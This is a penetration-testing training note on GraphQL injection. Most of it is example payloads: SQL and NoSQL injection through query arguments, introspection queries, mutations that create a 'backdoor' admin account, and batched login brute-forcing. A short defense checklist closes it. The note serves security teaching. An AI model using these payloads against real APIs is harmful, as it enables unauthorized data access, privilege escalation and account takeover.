---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.13 GraphQL Injection"
---

# 10.13 — GraphQL Injection

## GraphQL Overview

GraphQL is an API query language where clients specify exactly what data they need. GraphQL injection occurs when:
1. Arguments are passed unsanitized to backend SQL/NoSQL queries
2. Schema introspection reveals sensitive data
3. Input validation is missing

*For full GraphQL security testing, see [[Module 14 - GraphQL Security]]. This note covers injection specifically.*

```
GRAPHQL QUERY:
  query {
    user(id: "USER_INPUT") {
      name
      email
    }
  }

IF USER_INPUT GOES INTO SQL:
  SELECT * FROM users WHERE id = 'USER_INPUT'
  
INJECT: 1' OR '1'='1
QUERY becomes:
  SELECT * FROM users WHERE id = '1' OR '1'='1'
→ SQLi via GraphQL!
```

---

## GraphQL SQL Injection

```graphql
# INJECT IN STRING ARGUMENT:
query {
  user(username: "admin' OR '1'='1") {
    id name email
  }
}

# INJECT IN NUMERIC ARGUMENT:
query {
  product(id: 1 OR 1=1) {
    name price
  }
}

# UNION INJECTION:
query {
  search(query: "' UNION SELECT username,password,3 FROM users--") {
    result
  }
}

# TIME-BASED BLIND:
query {
  user(username: "admin' AND SLEEP(5)--") {
    id
  }
}
```

---

## GraphQL NoSQL Injection

```graphql
# MONGODB OPERATOR INJECTION:
# If arguments passed directly to MongoDB:
query {
  user(filter: "{\"username\": {\"$ne\": null}}") {
    id username
  }
}
# $ne:null = match where username is not null = ALL USERS!

# VIA VARIABLES:
query userSearch($filter: String!) {
  users(where: $filter) {
    id username password
  }
}
# Variables: {"filter": "{\"password\": {\"$gt\": \"\"}}"}
# $gt:"" = all non-empty passwords = ALL USERS!
```

---

## GraphQL Introspection (Schema Disclosure)

```graphql
# FULL SCHEMA INTROSPECTION:
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# QUERY ALL TYPES:
{ __schema { types { name } } }

# QUERY A SPECIFIC TYPE:
{
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}

# IMPORTANT: Introspection shows ALL fields including hidden ones!
# May reveal: password, adminToken, secretKey fields!
```

---

## Mutations for Privilege Escalation

```graphql
# IF MUTATIONS LACK AUTHORIZATION CHECKS:
mutation {
  updateUserRole(userId: "123", role: "ADMIN") {
    success
    user {
      id role
    }
  }
}

# CREATE ADMIN USER:
mutation {
  createUser(
    username: "backdoor",
    password: "attacker123",
    role: "ADMIN"
  ) {
    id token
  }
}

# DIRECT OBJECT REFERENCE — ACCESS OTHER USER'S DATA:
query {
  user(id: "VICTIM_USER_ID") {
    name email phone socialSecurityNumber
  }
}
```

---

## Batching Attack (Rate Limit Bypass)

```graphql
# SEND MULTIPLE QUERIES IN ONE REQUEST (bypasses per-request rate limits!):
[
  {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password3\") { token } }"},
  ...
]
# This is a batch — many apps allow it → brute force login!

# ALIAS BATCHING (single query, multiple aliases):
query {
  a1: user(username: "admin", password: "password1") { token }
  a2: user(username: "admin", password: "password2") { token }
  a3: user(username: "admin", password: "password3") { token }
}
```

---

## Testing Tools

```bash
# GRAPHQL INTROSPECTION:
# Burp Suite → Send GraphQL query
# GraphiQL → browser-based IDE (often exposed at /graphql)
# InQL Burp Extension → automated introspection + query generation

# TEST ENDPOINT:
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# IF INTROSPECTION DISABLED:
# Try: InQL field suggestion (types are guessable from error messages)
# Clairvoyance tool: wordlist-based schema inference

# AUTOMATION:
# Graphinder (Python) — automated GraphQL security testing
# GraphQL Threat Matrix — checklist
```

---

## Defense

```
PROTECTION:
  1. Validate and sanitize ALL arguments before passing to DB
  2. Use parameterized queries in backend resolvers
  3. Disable introspection in production:
     Apollo: introspection: false
     Hasura: HASURA_GRAPHQL_ENABLE_INTROSPECTION=false
  4. Implement per-query depth limiting
  5. Implement per-operation cost analysis
  6. Disable query batching or limit batch size
  7. Use proper authentication checks on all mutations/queries
  8. Implement field-level authorization
```

---

## Related Notes
- [[Module 14 - GraphQL Security]] — full GraphQL testing module
- [[Module 06 - SQL Injection]] — SQLi via GraphQL arguments
- [[20 - NoSQL Injection]] — MongoDB via GraphQL
